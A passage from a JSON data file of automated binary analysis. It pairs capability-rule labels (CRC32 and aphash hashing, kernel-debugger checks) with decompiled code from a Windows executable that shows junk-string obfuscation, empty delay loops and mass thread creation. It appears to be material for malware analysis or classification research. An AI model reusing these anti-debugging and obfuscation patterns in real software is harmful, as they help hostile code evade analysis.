        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00404444(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack240;\n    uchar auStack236 [24];\n    uchar auStack212 [24];\n    int32_t iStack188;\n    int32_t iStack184;\n    uchar auStack180 [24];\n    uchar auStack156 [24];\n    int32_t iStack132;\n    int32_t iStack128;\n    uint uStack124;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffef8;\n    uStack28 = 0x4505c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40be5400;\n    uStack48 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"apmykvxparidjqkhgubulbvmdhcqpmckwgacnireuaaskhbrppujzdjbhkxldkabljcuifvpjw\");\n    uStack24 = 1;\n    fcn.00401e79(\"mrgrsdunoqwbjmjmmuohvc\");\n    uStack104 = *0x546db8;\n    uStack112 = *0x546da8;\n    uStack120 = *0x546d98;\n    uStack124 = 0x592;\n    for (iStack128 = 0x1b; 0 < iStack128; iStack128 = iStack128 + -1) {\n    }\n    for (iStack132 = 7; 0 < iStack132; iStack132 = iStack132 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"mrgrsdunoqwbjmjmmuohvc\");\n    uStack24 = 4;\n    fcn.00401e79(\"mrgrsdunoqwbjmjmmuohvc\");\n    uVar1 = fcn.004042dc(auStack180, auStack156);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack184 = 4; 0 < iStack184; iStack184 = iStack184 + -1) {\n        }\n    }\n    for (iStack188 = 0x3c; 0 < iStack188; iStack188 = iStack188 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"mrgrsdunoqwbjmjmmuohvc\");\n    uStack24 = 3;\n    fcn.00401e79(\"mrgrsdunoqwbjmjmmuohvc\");\n    uVar1 = fcn.00405b37(auStack236, auStack212);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack240 = 99; 0 < iStack240; iStack240 = iStack240 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 824
    },
    "00404511": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00404511(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [24];\n    int32_t iStack104;\n    uchar uStack73;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff48;\n    uStack28 = 0x450920;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40a97200;\n    uStack48 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"npkyonwufhtvbjbcupqrfikcqgjopiqalxtsjveqmweqxmjrjebiozcjurzdawhxorjnhdlaridperikeqxiieycffm\");\n    uStack73 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"zofvmlnaxbsmegcmfylrcqnimmmmvmsyyzoctxlusvrgzzqdefqzcjzaccioazxzgttyyqzrsnjnwilazphzthd\");\n    for (iStack104 = 0x50; 0 < iStack104; iStack104 = iStack104 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"zofvmlnaxbsmegcmfylrcqnimmmmvmsyyzoctxlusvrgzzqdefqzcjzaccioazxzgttyyqzrsnjnwilazphzthd\");\n    uStack24 = 5;\n    fcn.00401e79(\"zofvmlnaxbsmegcmfylrcqnimmmmvmsyyzoctxlusvrgzzqdefqzcjzaccioazxzgttyyqzrsnjnwilazphzthd\");\n    uVar1 = fcn.004042dc(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack156 = 0x52; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 649
    },
    "00404539": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl\nfcn.00404539(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000002c;\n    int32_t iStack260;\n    uchar auStack256 [24];\n    uchar auStack232 [27];\n    uchar uStack205;\n    uint uStack180;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uchar uStack133;\n    ulong uStack80;\n    uint8_t uStack65;\n    ulong uStack64;\n    uint8_t uStack50;\n    uchar uStack49;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffee8;\n    uStack48 = CONCAT44(in_stack_0000002c, arg_2ch);\n    uStack64 = CONCAT44(noname_5, arg_18h);\n    uStack80 = CONCAT44(noname_1, arg_8h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450760;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uVar2 = CONCAT11(arg_24h, arg_14h) & 0x1ff;\n    uStack49 = uVar2 >> 8;\n    uStack50 = arg_20h & 1;\n    uStack65 = uVar2 & 1;\n    fcn.00401e79(\"inftoexpboqbtqtwzupvmjihfrniuumkvqeonswepiqzfnidwkjft\");\n    uStack24 = 0;\n    fcn.00401e79(\"dsrmcvlsecooajuqjutizwwgglyhvfirynlxevtbltjfrlyeuptpvjmwizwiuxrulghryjiyqhyzgpxyuiizj\");\n    uStack133 = 0;\n    uStack140 = 0x40cf4080;\n    uStack144 = 0;\n    uStack148 = 0x40f29230;\n    uStack152 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"sqsoxiahzftagqcnctjknzpfw\");\n    uStack180 = 0x144;\n    uStack24 = 2;\n    fcn.00401e79(0x54b23b);\n    uStack205 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"inftoexpboqbtqtwzupvmjihfrniuumkvqeonswepiqzfnidwkjft\");\n    uStack24 = 4;\n    fcn.00401e79(\"inftoexpboqbtqtwzupvmjihfrniuumkvqeonswepiqzfnidwkjft\");\n    uVar1 = fcn.004042dc(auStack256, auStack232);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack260 = 0x3b; 0 < iStack260; iStack260 = iStack260 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546e14;\n}\n",
        "token_count": 900
    },
    "00404561": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00404561(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack124;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x451600;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"lsmpurpzimojxlnkpwxrdshdmfucwobtmmuoashpivufkwimseqglynexbfdbzsstqqiazuuzy\");\n    uStack24 = 2;\n    fcn.00401e79(\"awmnlxugxlhpgfpouztmbknvcmxkrxgwdpotvlzljzcmjkpkjknlwcyzpjkqsraqzvrhdzynpadfmwadgelispngsmlg\");\n    for (iStack124 = 0x2c; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 319
    },
    "00404584": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404584(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((*(arg_8h + 0xc) >> 0xc & 1) == 0) {\n        uVar1 = fcn.00406005(arg_8h);\n        iVar4 = 0x571f68;\n        if ((uVar1 == 0xffffffff) || (uVar1 == 0xfffffffe)) {\n            iVar5 = 0x571f68;\n        }\n        else {\n            iVar5 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x575220);\n        }\n        if (*(iVar5 + 0x29) == '\\0') {\n            if ((uVar1 != 0xffffffff) && (uVar1 != 0xfffffffe)) {\n                iVar4 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x575220);\n            }\n            if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x004a8ec6;\n        }\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        uVar3 = 0;\n    }\n    else {\ncode_r0x004a8ec6:\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 374
    },
    "004045a7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004045a7(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = 0xffffffff;\n        if ((*(arg_8h + 0xc) >> 0xd & 1) != 0) {\n            uVar2 = fcn.004042b9(arg_8h);\n            fcn.004034bd(arg_8h);\n            arg_8h_00 = fcn.00406005(arg_8h);\n            iVar3 = fcn.00405218(arg_8h_00);\n            if (iVar3 < 0) {\n                uVar2 = 0xffffffff;\n            }\n            else if (*(arg_8h + 0x1c) != 0) {\n                fcn.0040640b(*(arg_8h + 0x1c));\n                *(arg_8h + 0x1c) = 0;\n            }\n        }\n        fcn.00406636(arg_8h);\n    }\n    return uVar2;\n}\n",
        "token_count": 311
    },
    "004045b1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004045b1(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    return;\n}\n",
        "token_count": 53
    },
    "004045bb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004045bb(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar2 = fcn.0040185c();\n        *puVar2 = 0;\n        puVar2 = fcn.00403a35();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h) && (arg_8h < *0x575488)) {\n            iVar3 = (arg_8h & 0x3f) * 0x38;\n            iVar1 = *((arg_8h >> 6) * 4 + 0x575220);\n            if ((*(iVar1 + 0x28 + iVar3) & 1) != 0) {\n                return *(iVar1 + 0x18 + iVar3);\n            }\n        }\n        puVar2 = fcn.0040185c();\n        *puVar2 = 0;\n        puVar2 = fcn.00403a35();\n        *puVar2 = 9;\n        fcn.004037ce();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 277
    },
    "004046ba": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004046ba(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.004045bb(arg_8h);\n    if (iVar1 != -1) {\n        if (((arg_8h == 1) && ((*(*0x575220 + 0x98) & 1) != 0)) || ((arg_8h == 2 && ((*(*0x575220 + 0x60) & 1) != 0))))\n        {\n            iVar1 = fcn.004045bb(2);\n            iVar2 = fcn.004045bb(1);\n            if (iVar2 == iVar1) goto code_r0x004d0970;\n        }\n        uVar3 = fcn.004045bb(arg_8h);\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x004d09c2;\n        }\n    }\ncode_r0x004d0970:\n    iVar1 = 0;\ncode_r0x004d09c2:\n    fcn.004031ed(arg_8h);\n    *(*((arg_8h >> 6) * 4 + 0x575220) + 0x28 + (arg_8h & 0x3f) * 0x38) = 0;\n    if (iVar1 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        fcn.00404b9c(iVar1);\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 393
    },
    "004047f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004047f0(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x575488)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x575220) + 0x28 + (arg_8h & 0x3f) * 0x38) & 1) != 0)) {\n            var_ch = &arg_8h;\n            var_8h = arg_8h;\n            var_10h = arg_8h;\n            uVar2 = fcn.004d0c87(&var_10h, &var_ch);\n            return uVar2;\n        }\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n        fcn.004037ce();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 304
    },
    "004047fa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004047fa(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    int32_t var_fch;\n    uint var_f8h;\n    uint var_e0h;\n    int32_t var_c8h;\n    uint var_c4h;\n    uint var_ach;\n    int32_t var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint var_74h;\n    uchar var_59h;\n    uint var_58h;\n    uint var_40h;\n    uint var_28h;\n    uchar var_21h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffee8;\n    var_14h = 0x450e40;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_21h = 1;\n    var_28h = 0xb22;\n    var_10h = 0;\n    fcn.00401e79(\"qurugpzqavaohvmlgosryluowxeqfhnnmugazzgmnurdprjyf\");\n    var_10h = 1;\n    fcn.00401e79(\"yzdprulfclfxywolyfggufopxpndvsuembl\");\n    var_59h = 1;\n    var_10h = 2;\n    fcn.00401e79(\"qurugpzqavaohvmlgosryluowxeqfhnnmugazzgmnurdprjyf\");\n    var_10h = 5;\n    fcn.00401e79(\"qurugpzqavaohvmlgosryluowxeqfhnnmugazzgmnurdprjyf\");\n    uVar1 = fcn.00405b37(&var_8ch, &var_74h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_90h = 0x1a; 0 < var_90h; var_90h = var_90h + -1) {\n        }\n    }\n    for (var_94h = 0x35; 0 < var_94h; var_94h = var_94h + -1) {\n    }\n    var_10h = 2;\n    fcn.00401e79(\"yzdprulfclfxywolyfggufopxpndvsuembl\");\n    var_10h = 4;\n    fcn.00401e79(\"yzdprulfclfxywolyfggufopxpndvsuembl\");\n    uVar1 = fcn.004042dc(&var_c4h, &var_ach);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_c8h = 0xf; 0 < var_c8h; var_c8h = var_c8h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"qurugpzqavaohvmlgosryluowxeqfhnnmugazzgmnurdprjyf\");\n    var_10h = 3;\n    fcn.00401e79(\"qurugpzqavaohvmlgosryluowxeqfhnnmugazzgmnurdprjyf\");\n    uVar1 = fcn.004042dc(&var_f8h, &var_e0h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_fch = 0x19; 0 < var_fch; var_fch = var_fch + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"qzfjhjlbggfqulx\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 1028
    },
    "0040486d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040486d(uint arg_8h)\n\n{\n    uint var_24h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401e79(\"belldddobictsizoqyg\");\n    fcn.00403b02();\n    return 0;\n}\n",
        "token_count": 78
    },
    "00404872": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404872(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack232;\n    uchar auStack228 [24];\n    uchar auStack204 [24];\n    int32_t iStack180;\n    int32_t iStack176;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack80;\n    uint uStack76;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffef8;\n    uStack28 = 0x44ff60;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x1e0;\n    uStack24 = 0;\n    fcn.00401e79(\"lgeqgfwkmaimkhztpnppysiytgalldfyi\");\n    uStack76 = 0x40eceac0;\n    uStack80 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"shmlbczuzwesogbgrcholcuhzqddxcifpncvmh\");\n    uStack24 = 2;\n    fcn.00401e79(\"auctyfkhxgyjxzctiwffmxgslkjeyqadwuytztx\");\n    uStack132 = 0x40ac2c00;\n    uStack136 = 0;\n    uStack140 = 0x40e715e0;\n    uStack144 = 0;\n    uStack148 = 0x1526;\n    uStack24 = 3;\n    fcn.00401e79(\"tqgwstpjacpqvhgesxfhbepqlcikkmpxxsfqfmzudxxjsgnenlgxmmxcgmzjgjnnwuitceajczysxycrjsnfdjgacngmx\");\n    for (iStack176 = 0x36; 0 < iStack176; iStack176 = iStack176 + -1) {\n    }\n    for (iStack180 = 0x54; 0 < iStack180; iStack180 = iStack180 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"auctyfkhxgyjxzctiwffmxgslkjeyqadwuytztx\");\n    uStack24 = 5;\n    fcn.00401e79(\"auctyfkhxgyjxzctiwffmxgslkjeyqadwuytztx\");\n    uVar1 = fcn.00405b37(auStack228, auStack204);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack232 = 0x55; 0 < iStack232; iStack232 = iStack232 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"snrs\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 827
    },
    "004048f9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004048f9(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack148;\n    int32_t iStack144;\n    int32_t iStack140;\n    int32_t iStack136;\n    uchar auStack132 [24];\n    uchar auStack108 [24];\n    int32_t iStack84;\n    int32_t iStack80;\n    uint uStack76;\n    ulong uStack72;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff40;\n    uStack28 = 0x418290;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    uStack72 = *0x4ec378;\n    iStack80 = 0x456;\n    for (iStack84 = 0; uStack24 = 1,  iStack84 < 0x5fbf; iStack84 = iStack84 + 1) {\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(5);\n        uStack76 = fcn.00401596(iStack80 << 2);\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0);\n    }\n    fcn.00401e79(\"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    uStack24 = 2;\n    fcn.00401e79(\"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    uVar1 = fcn.00405b37(auStack132, auStack108);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack136 = 0x2e; 0 < iStack136; iStack136 = iStack136 + -1) {\n        }\n    }\n    for (iStack140 = 0x18; 0 < iStack140; iStack140 = iStack140 + -1) {\n    }\n    for (iStack144 = 0x5a; 0 < iStack144; iStack144 = iStack144 + -1) {\n    }\n    for (iStack148 = 0x29; 0 < iStack148; iStack148 = iStack148 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 739
    },
    "00404921": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00404921(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.004027f2(arg_10h);\n    iVar2 = fcn.00402b26();\n    if ((((*(iVar2 + 0x20) != 0) || (*arg_8h == -0x1f928c9d)) || (*arg_8h == -0x7fffffda)) ||\n       (((*arg_18h & 0x1fffffff) < 0x19930522 || ((*(arg_18h + 8) & 1) == 0)))) {\n        if ((*(arg_8h + 1) & 0x66) == 0) {\n            if (((arg_18h[3] != 0) || ((0x19930520 < (*arg_18h & 0x1fffffff) && (arg_18h[7] != 0)))) ||\n               ((0x19930521 < (*arg_18h & 0x1fffffff) && ((arg_18h[8] >> 2 & 1) != 0)))) {\n                if ((((*arg_8h == -0x1f928c9d) && (2 < arg_8h[4])) && (0x19930522 < arg_8h[5])) &&\n                   (pcVar1 = *(arg_8h[7] + 8),  pcVar1 != NULL)) {\n                    (**0x578000)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff);\n                    uVar3 = (*pcVar1)();\n                    return uVar3;\n                }\n                fcn.00489f06(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n            }\n        }\n        else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n            fcn.00403e36(arg_ch, arg_14h, arg_18h);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 563
    },
    "00404944": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00404944(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack168;\n    int32_t iStack164;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x450dc0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"gjppqixityacyvutrqapwefboznpkqynhatsveeqeaolo\");\n    uStack24 = 0;\n    fcn.00401e79(\"tipkebrechcftdwukszoeenobkw\");\n    for (iStack164 = 6; 0 < iStack164; iStack164 = iStack164 + -1) {\n    }\n    for (iStack168 = 0x58; 0 < iStack168; iStack168 = iStack168 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 312
    },
    "00404953": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00404953(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    int32_t iStack124;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x418230;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"nyvvleydh\");\n    for (iStack124 = 0xf; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    for (iStack128 = 0x60; 0 < iStack128; iStack128 = iStack128 + -1) {\n    }\n    for (iStack132 = 0x4f; 0 < iStack132; iStack132 = iStack132 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"ekrd\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
